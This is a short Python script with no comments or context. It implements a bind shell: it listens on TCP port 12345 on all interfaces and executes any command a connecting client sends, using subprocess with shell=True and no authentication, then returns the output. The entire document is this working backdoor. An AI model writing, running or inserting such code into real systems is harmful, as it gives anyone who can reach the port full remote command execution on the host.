import socket, subprocess

h = '0.0.0.0'

p = 12345

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

    s.bind((h, p))

    s.listen()

    c, a = s.accept()

    with c:

        print('Connected by', a)

        while True:

            d = c.recv(1024)

            if not d:

                break

            pr = subprocess.Popen(d.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            o, e = pr.communicate()

            c.sendall(o + e)